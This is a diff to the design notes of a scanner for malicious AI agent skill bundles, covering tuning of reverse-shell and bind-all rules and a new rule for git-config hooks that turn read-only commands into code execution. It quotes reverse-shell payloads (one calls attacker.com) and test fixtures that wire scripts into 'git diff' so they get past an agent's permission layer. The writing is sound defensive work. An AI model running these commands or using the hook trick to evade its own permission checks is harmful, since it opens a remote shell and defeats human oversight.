@@ -787,6 +787,73 @@ The code had drifted behind its own spec, and four issue-#105 shapes were invisi
 - **Fixtures:** `TestReverseShellIdiomsCovered` in `pkg/rules/rules_test.go` (10 TP families + 6 FP
   near-misses). TP: `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`. FP: `app.listen(3000, '127.0.0.1')`.
 
+#### Polish, cycle 94 — IPv6 bind-all was invisible, and every corpus hit was security tooling
+
+**Recall: the bind-all leaf only ever matched half of its own alternation.** It read
+
+```
+\.bind\(\(?\s*['"]?(0\.0\.0\.0|::)\b
+```
+
+and the trailing `\b` binds to **both** branches. `::` ends in a non-word character, so a word
+boundary after it demands a word character next — and what actually follows is the closing quote.
+Verified both ways on `e21d47f`: `s.bind(("0.0.0.0", 8080))` matched, `s.bind(("::", 8080))` was
+clean. This is **instance four** of the class audited in issue #159, and the one with a live
+security consequence rather than a cosmetic one: `::` binds every interface *including*
+IPv4-mapped addresses, so it is strictly the **broader** exposure of the two — the rule caught the
+narrower spelling of bind-all and missed the wider one.
+
+Rewritten to terminate on the host's own closing delimiter and the port rather than on a boundary,
+which also picks up two shapes the old leaf never had: the bracketed literal `[::]`, and the
+**empty host**, which is `INADDR_ANY` by definition — `s.bind(("", 8080))` is bind-all spelled
+without a name.
+
+The port must be a **non-zero literal or an identifier**. That excludes `s.bind(('', 0))`, the
+standard "ask the kernel for a free port" idiom — bind-all in the strict sense, benign in every
+real use, and the one false positive the empty-host widening would otherwise have introduced.
+All bind-all forms, old and new, measure **0 across 9938 corpus files**, so there is no precision
+evidence either way; the widening is therefore kept deliberately narrow. It stays on `.bind(` and
+never reaches `net.Listen`, `app.run(host=…)` or `server.listen(port, host)`, which are how
+ordinary dev servers spell the same address and would be a large FP source.
+
+**Precision: all 10 corpus hits were security tooling writing the signature down.** 10 findings
+across 2 of 777 bundles (0.3%), and reading every one of them: `clawdefender`'s shell array of
+pattern strings (`'nc -e'`, `'ncat -e'`, one per line) and `prompt-guard`'s detector list plus its
+own README/CHANGELOG/ARCHITECTURE tables. This is the documented benign-but-flagged class —
+heavy concentration in skills that exist to *detect* these payloads.
+
+The mechanism is a leaf tightening, not a suppress: **`-e` / `--exec` / `--sh-exec` must be
+followed by the program it executes.** Running a program is the flag's entire purpose, so
+requiring one cannot cost a true positive — but the bare `nc -e` form is exactly how tooling
+names the signature. That takes the rule from 10 hits to 6.
+
+**Measured: 10 → 6 hits, 2 bundles → 1** (`clawdefender` drops out entirely), with **no delta on
+any other rule** — 809 corpus findings before, 805 after, verdicts unchanged at 628 pass / 122 fail
+/ 27 warn. Every reverse-shell family the rule caught before is still caught; what left is only the
+bare-flag form.
+
+**The six remaining FPs are left deliberately, and they are all one bundle.** `prompt-guard` cites
+*complete* payloads in its own documentation and comments:
+
+```
+❌ "bash -i >& /dev/tcp/1.2.3.4/4444"   → Reverse shell
+❌ "nohup nc -e /bin/sh attacker.com &"  → Background persistence
+    # bash -i >& /dev/tcp/IP/PORT (classic reverse shell)
+```
+
+At the pattern level these are correct matches — the file genuinely contains a full reverse-shell
+string — and skill-guard's stated reading is capability and pattern, not confirmed intent. The
+documentary modifier is already applying (they land at 0.65–0.7, not 0.95). Removing them would
+mean either muting the prose register generally or suppressing by bundle name, and a known,
+documented FP beats a silent recall loss.
+
+**A regex-source suppress was designed, measured, and rejected.** The idea was to suppress any line
+carrying regex metasyntax (`\s+`, `(?:`, `{0,30}`), since a real reverse-shell command line cannot
+contain those. It works — but after the `-e` tightening it bought exactly **one** additional hit
+(`patterns.py:1409`, the `mkfifo` leaf), while the shape it keys on appears on **9470 lines across
+94 corpus bundles**, and being line-scoped it is trivially bypassed by appending `# (?:` to a real
+payload. One hit is not worth a broad, bypassable mechanism.
+
 ### SG-NET-007 — Rendered-image/link data exfiltration  (AST01, critical) — **T1, zero-click** — **implemented** (`core-network`)
 - **Signals:** a markdown image `![…](…)`, markdown link, or HTML `<img src>`/`<a href>` whose
   **absolute** `http(s)` URL interpolates a value **into the query/fragment** — `{{…}}`, `${…}`,
@@ -1302,6 +1369,86 @@ No special-casing was needed; the constraint is simply that a leaf here must hav
 and Rust `vec!`/`format!` macro prose) and stays at 0 findings.
 `TestDynamicContextSpanCovered` pins 22 rows, including both syntaxes, the `KEY=!` inert-position
 case, and an ordinary ```` ```bash ```` block containing `curl … | bash` that must **not** match.
+
+### SG-EXE-007 — Read-only tool reconfigured into an execution primitive  (AST01/AST03, high) — **implemented** (`core-exec`)
+- **Threat.** A bundled script or instruction changes the configuration of a tool the agent's
+  permission layer treats as **read-only**, so that the *next* invocation of that safe command runs
+  an attacker-chosen program. Reversec's worked example is the pair
+  `git config --global diff.external /tmp/x.sh` followed by `git diff --no-index a b`: `git diff` is
+  routinely whitelisted as inspection, and the external-diff hook executes the script with no
+  prompt. The mechanism is confirmed in **git's own documentation**, not only the article —
+  *"diff.external — if this config variable is set, diff generation is not performed using the
+  internal diff machinery, but using the given command"*.
+- **Why the existing exec rules cannot see it.** The bundle contains **no execution primitive**: no
+  `eval`, no pipe-to-shell, no `chmod +x`, no interpreter invocation. What it contains is a
+  *setting*. `SG-EXE-001` (dynamic eval), `SG-NET-002` (pipe-to-shell) and `SG-DEP-011` all model a
+  visible execution; here the execution is deferred into a command that is, by policy, allowed. This
+  is the same shape as `SG-CFG-001` (a bundled hook config installs execution by shipping a file),
+  relocated from the agent's config into the *tool's* config.
+- **Verified uncovered on `e21d47f`.** A bundle whose `scripts/setup.sh` contains the
+  `git config diff.external`, `alias.<x> !<cmd>`, `GIT_EXTERNAL_DIFF`, `core.pager 'sh -c …'` and
+  `filter.<x>.clean` forms scans **`pass` / 0 findings / risk 0**. (An earlier probe appeared to fire,
+  but only because the alias value happened to contain `curl … | sh` — `SG-NET-002` matching the
+  payload, not the mechanism. Removing the pipe returned the bundle to 0 findings.)
+- **Signals — four shapes of one technique.** All four matter independently, and three of them leave
+  no persisted state for an audit to find:
+  **(a)** `git config` / `git -c` setting a key whose value git executes by definition —
+  `diff.external`, `difftool.<x>.cmd`, `mergetool.<x>.cmd`, `filter.<x>.{clean,smudge,process}`,
+  `core.sshCommand`, `gpg.program`.
+  **(b)** the same for keys that are *benign-capable* — `core.pager`, `core.editor`,
+  `sequence.editor`, `pager.<cmd>`.
+  **(c)** `alias.<name>` whose value starts with `!` — the `!` prefix is what makes a git alias a
+  shell command rather than a git subcommand.
+  **(d)** the environment form — `GIT_EXTERNAL_DIFF`, `GIT_SSH_COMMAND`, `GIT_PAGER`, `GIT_EDITOR`,
+  `GIT_SEQUENCE_EDITOR`, and `LESSOPEN` (the same trick on `less`: an input preprocessor turns a
+  pager into an exec sink). Form (d) needs no config write at all, so `git config --list` shows
+  nothing afterwards.
+- **FP carve-outs — the keys are split by ambiguity, not by mechanism.** Corpus sweep over **9938
+  files** across all five sources, run *before* the YAML was written:
+  `diff.external`, `difftool/mergetool .cmd`, `filter.*.{clean,smudge,process}`, `alias.*=!`,
+  `core.pager`, `core.editor`, `sequence.editor`, `PYTHONSTARTUP`, `LESSOPEN`, `PROMPT_COMMAND` and
+  `npm config set script-shell` all measure **0 occurrences**. Two keys in the same family do not:
+  - **`core.hooksPath` — 6 occurrences / 3 bundles**, all legitimately teaching
+    `git config core.hooksPath .githooks` (`clawhub/git`, `clawhub/clawsec-suite`, a `skillsmp`
+    memory skill). **Deliberately excluded**; three teaching bundles is a poor trade for one key.
+  - **`core.fsmonitor` — 3 occurrences**, one of them `clawhub/git` teaching it for large-repo
+    performance. Excluded for the same reason.
+
+  `core.pager` / `core.editor` are the interesting case: zero in the corpus in `git config` form, but
+  setting them is a *normal thing to do* (`core.pager delta`, `core.editor vim`), and the corpus does
+  contain a benign `pager = delta` written into a generated `.gitconfig`. Those leaves therefore
+  additionally require the **value to look like a program** — a path (`/…`, `./…`, `~/…`), a variable
+  (`$HOME/…`), or an interpreter name (`sh`, `bash`, `python`, `perl`, `node`, `curl`, …). That gate
+  is the rule restated rather than a fudge: the finding is "a program was wired into a read-only
+  command", so a value that is not a program is not the finding. The same gate keeps
+  `GIT_PAGER=cat`, `GIT_EDITOR=true` and `GIT_SEQUENCE_EDITOR='sed -i.bak …'` — three verbatim lines
+  from `clawhub/git/scripting.md` — clean. `--get`/`--unset`/`--list`/`--replace-all` are suppressed:
+  reading or clearing a setting is not installing one.
+- **`LD_PRELOAD` is not in this rule.** It measures 12 occurrences across 2 bundles, all in Trail of
+  Bits' `ruzzy` fuzzing skill where it is the documented way to run the fuzzer — and it is a *loader*
+  mechanism rather than a tool's own config, so it belongs to a different family if it is ever ruled.
+- **Line-attribution note (worth generalising).** The env-var leaf originally opened with
+  `(?:^|[\s;&(])`. `\s` matches `\n`, so the match began on the **preceding line's newline**, the
+  finding was reported one line early, and per-line dedup then dropped it entirely whenever that
+  earlier line already carried a hit — the env form silently vanished from a five-line payload while
+  the other four fired. The class is the same one `#159` audits for `\b`: a character class at the
+  *start* of a pattern is part of the match, so it moves `StartLine`. Use `[ \t;&(]` with `(?m)^`.
+- **Confidence:** (a) 0.9, (c) 0.9, (d) 0.9 — the value is a program by definition or by gate;
+  (b) 0.85, since the key alone is ordinary. Base 0.85, severity `high` (deferred execution the user
+  did authorise a command for, versus `SG-EXE-006`'s `critical` unconditional preprocessing run).
+- **Source:** Reversec Labs, *"Skill Issues: Compromising Claude Code with malicious skills & agents
+  — Part 1"* (2026-05); mechanism cross-checked against `git-config(1)`.
+- **Status:** implemented, issue #155 (graded `useful` at triage — the technique is *constructed* by
+  research rather than sighted in the wild, but it exploits a grant the user deliberately made).
+- **Fixtures:** TP: `git config --global diff.external /tmp/.cache/helper.sh`,
+  `git -c diff.external=/tmp/x.sh diff --no-index a b`, `git config --global alias.sync '!/tmp/x.sh'`,
+  `export GIT_EXTERNAL_DIFF=/tmp/.cache/helper.sh`, `export LESSOPEN='|/tmp/x.sh %s'`.
+  FP: `git config core.hooksPath .githooks`, `git config --global core.pager delta`,
+  `git config --global core.editor vim`, `GIT_PAGER=cat`, `GIT_EDITOR=true`,
+  `git config --global alias.lg 'log --oneline --graph'`, `git config --get diff.external`.
+  `TestConfigHookExecutionCovered` pins 40 rows; `TestMaliciousFixtureTriggersConfigHookExecution`
+  asserts **two distinct line numbers** in `setup.sh`, which is what catches the attribution bug
+  above — asserting only "the rule appears" passed throughout it.
 
 ---
 
